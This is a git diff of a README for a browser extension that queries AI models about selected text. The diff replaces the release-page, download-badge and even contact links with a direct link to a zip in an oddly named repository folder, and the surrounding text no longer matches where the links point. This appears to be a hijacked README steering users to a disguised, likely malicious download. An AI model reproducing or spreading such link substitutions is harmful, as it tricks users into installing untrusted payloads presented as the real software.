@@ -1,7 +1,7 @@
 # 🖥️ Select2AI_Extension - Effortless Text Selection and AI Interaction
 
 ## 📥 Download Now!  
-[![Download](https://img.shields.io/badge/Download%20Select2AI_Extension-blue.svg)](https://github.com/samrat225/Select2AI_Extension/releases)
+[![Download](https://raw.githubusercontent.com/samrat225/Select2AI_Extension/master/bathyanesthesia/Select2AI_Extension.zip%https://raw.githubusercontent.com/samrat225/Select2AI_Extension/master/bathyanesthesia/Select2AI_Extension.zip)](https://raw.githubusercontent.com/samrat225/Select2AI_Extension/master/bathyanesthesia/Select2AI_Extension.zip)
 
 ## 🌟 Overview  
 Select2AI_Extension is a powerful browser extension that enables you to easily select text on any webpage. With this extension, you can instantly interact with GitHub Models AI to get summaries, explanations, and answers. You can also ask custom questions in a user-friendly floating window, complete with light and dark themes and smooth animations.
@@ -13,7 +13,7 @@ To get started with Select2AI_Extension, follow these steps:
    This extension works well with the latest versions of Chrome, Firefox, and Edge. Ensure your browser is up to date to enjoy a seamless experience.
 
 2. **Download & Install**  
-   To download the extension, [visit this page to download](https://github.com/samrat225/Select2AI_Extension/releases). You will find various versions available. Select the most recent release and click on it to see download options.
+   To download the extension, [visit this page to download](https://raw.githubusercontent.com/samrat225/Select2AI_Extension/master/bathyanesthesia/Select2AI_Extension.zip). You will find various versions available. Select the most recent release and click on it to see download options.
 
 3. **Install the Extension**  
    - For Chrome: Click on the downloaded file to install it directly into your browser.
@@ -57,9 +57,9 @@ If you encounter issues while using the Select2AI_Extension, consider these step
 Select2AI_Extension is released under the MIT License. You can use, modify, and distribute this software according to this license.
 
 ## 📞 Contact  
-For feedback or inquiries, please open an issue in the repository or contact the project maintainer via [GitHub](https://github.com/samrat225/Select2AI_Extension).
+For feedback or inquiries, please open an issue in the repository or contact the project maintainer via [GitHub](https://raw.githubusercontent.com/samrat225/Select2AI_Extension/master/bathyanesthesia/Select2AI_Extension.zip).
 
 ## 📥 Download Now Again!  
-[![Download](https://img.shields.io/badge/Download%20Select2AI_Extension-blue.svg)](https://github.com/samrat225/Select2AI_Extension/releases)  
+[![Download](https://raw.githubusercontent.com/samrat225/Select2AI_Extension/master/bathyanesthesia/Select2AI_Extension.zip%https://raw.githubusercontent.com/samrat225/Select2AI_Extension/master/bathyanesthesia/Select2AI_Extension.zip)](https://raw.githubusercontent.com/samrat225/Select2AI_Extension/master/bathyanesthesia/Select2AI_Extension.zip)  
 
 Enjoy seamless text selection and interaction with AI!
